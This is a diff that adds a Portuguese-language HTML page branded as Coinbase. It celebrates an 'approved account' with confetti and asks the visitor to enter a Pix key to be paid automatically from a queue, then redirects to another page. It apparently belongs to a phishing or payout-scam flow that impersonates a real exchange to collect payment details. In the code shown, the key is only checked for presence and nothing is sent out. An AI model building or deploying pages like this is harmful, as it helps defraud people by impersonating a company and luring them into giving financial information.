@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Conta Aprovada - Coinbase</title>
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+  <style>
+    body { font-family: 'Inter', sans-serif; background: #f0f4f8; padding: 40px; text-align: center; }
+    .container { background: white; padding: 30px; max-width: 500px; margin: auto; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+    input, button { width: 100%; padding: 12px; margin-top: 15px; font-size: 16px; border-radius: 8px; border: 1px solid #ccc; }
+    button { background-color: #1652f0; color: white; font-weight: bold; cursor: pointer; }
+  </style>
+  <script>
+    window.onload = () => {
+      confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
+    };
+    function enviarPix() {
+      const chave = document.getElementById("pix").value;
+      if (chave) {
+        window.location.href = "loading2.html";
+      } else {
+        alert("Digite sua chave Pix para prosseguir.");
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h2>🎉 Conta Aprovada com Sucesso!</h2>
+    <p>Cadastre sua chave Pix para receber automaticamente quando seu número for chamado na fila:</p>
+    <input type="text" id="pix" placeholder="sua-chave@pix.com">
+    <button onclick="enviarPix()">Cadastrar chave Pix</button>
+  </div>
+</body>
+</html>
